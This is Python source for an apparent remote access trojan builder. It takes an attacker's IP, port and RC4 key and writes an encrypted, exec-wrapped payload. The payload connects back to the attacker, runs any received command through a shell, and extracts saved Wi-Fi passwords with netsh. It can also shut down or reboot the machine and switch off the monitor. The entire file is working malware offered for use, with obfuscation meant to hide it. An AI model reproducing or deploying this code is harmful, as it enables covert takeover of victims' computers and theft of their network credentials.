import RC4Encryption

key = input('Enter a key for the RC4 encrpytion: ').encode()
ip = input('Enter your IP: ')
while True:
    try:
        port = int(input('Enter a port: '))
        if port in range(0, 65536):
            break
        else:
            print('Error: Must be a number between 0 and 65535')
    except ValueError:
        print('Error: Must be a number between 0 and 65535')
        
code = r'''
def main():
    import socket, os, subprocess, RC4Encryption, ctypes, winreg, win32api, win32con, datetime, requests
    key = b'RC4KEY' #change to something more secure
    rc4 = RC4Encryption.RC4Encryption(key)
    rc4.make_key()
    rhost = 'HOST' #change to the attacker's ip
    rport = PORT #change to whatever port you are using
    buffer = 131072
    separator = "<sep>"
    s = socket.socket()
    while True:
        try:
            s.connect((rhost, rport))
            break
        except (TimeoutError, ConnectionRefusedError):
            continue
    cwd = os.getcwd()
    s.send(rc4.crypt(cwd.encode()))
    while True:
        cmd = rc4.crypt(s.recv(buffer)).decode()
        if cmd.lower() == 'isadmin':
            try:
                answer = os.getuid() == 0
            except AttributeError:
                answer = ctypes.windll.shell32.IsUserAnAdmin() != 0
            out = str(answer)
        elif cmd.lower() == 'getbrowser':
            path = r'Software\Microsoft\Windows\Shell\Associations\UrlAssociations\https\UserChoice'
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, path)
            out = winreg.QueryValueEx(key, 'ProgId')[0] + '\n'
        elif cmd.lower() == 'monoff':
            ctypes.windll.user32.SendMessageW(65535, 274, 61808, 2)
            out = ''
        elif cmd.lower() == 'monon':
            ctypes.windll.user32.SendMessageW(65535, 274, 61808, -1)
            win32api.mouse_event(win32con.MOUSEEVENTF_MOVE, 0, 0)
            out = ''
        elif cmd.lower() == 'reboot':
            os.system('reboot now')
        elif cmd.split()[0].lower() == 'cd':
            if len(cmd.split()) == 2:
                if cmd.split()[1] == "..":
                    os.chdir('\\'.join(os.getcwd().split('\\')[0:-1]))
                    cwd = os.getcwd()
                    out = ''
                else:
                    try:
                        os.chdir(' '.join(cmd.split()[1:]))
                        cwd = os.getcwd()
                        out = ''
                    except FileNotFoundError:
                        out = 'The system cannot find the path specified.'
            else:
                out = ''
        elif cmd.lower() == 'netprofiles':
            current = subprocess.getoutput('netsh wlan show interface').split('Profile')[1].split(': ')[1].split('\n')[0][0:-1]
            profiles = [i.split(' : ')[1] for i in subprocess.getoutput('netsh wlan show profiles').split('\n') if ': ' in i]
            profiles[profiles.index(current)] = current + ' (current)'
            wifi_info = {}
            for i in profiles:
                wifi_info[i] = ''
            for i in wifi_info:
                try:
                    password = subprocess.getoutput('netsh wlan show profiles "{}" key=clear'.format(i)).split('Security settings')[1].split('Cost settings')[0].split('Key Content            : ')[1].split('\n')[0]
                    wifi_info[i] = password
                except IndexError:
                    try:
                        wifi_info[i] = subprocess.getoutput('netsh wlan show profiles "{}" key=clear'.format(i.split(' (current)')[0])).split('Profile')[3].split('Key Content')[1].split(': ')[1].split('\n')[0]
                    except IndexError:
                        wifi_info[i] = 'N/A'
            final_info = [i + ': ' + wifi_info[i] for i in wifi_info]
            out = '\n'.join(final_info) + '\n'
        elif cmd.lower() == 'time': 
            out = datetime.datetime.now()
        elif cmd.lower() == 'shutdown':
            os.system('shutdown /s')
        elif cmd.lower() == 'ip':
            out = requests.get('http://wtfismyip.com/text').text
        elif cmd.lower() == 'help':
            out = \'''getbrowser: Checks default browser

ip: Gets public IP

isadmin: Checks if you have admin privelages

monoff: Turns off the monitor

monon: Turns on the monitor

netprofiles: Checks saved networks

reboot: reboots the computer

shutdown: Shuts down the computer

time: Gets system time

Anything else: Runs as a cmd command\'''
        else:
            out = subprocess.getoutput(cmd)
        cwd = os.getcwd()
        message = f"{out}{separator}{cwd}"
        s.send(rc4.crypt(message.encode()))
    s.close()
try:
    main()
except (ConnectionAbortedError, IndexError):
    pass'''.replace('RC4KEY', key.decode()).replace('HOST', ip).replace('PORT', str(port))

filename = input('Enter the output filename: ')
rc4 = RC4Encryption.RC4Encryption(key)
rc4.make_key()
encrypted = rc4.crypt(code.encode())
newcode = '''import RC4Encryption
encrypted = {}
rc4 = RC4Encryption.RC4Encryption({})
rc4.make_key()
exec(rc4.crypt(encrypted))'''.format(str(encrypted), key)
open(filename + '.py', 'w').write(newcode)
print('Saved as {}.py'.format(filename))
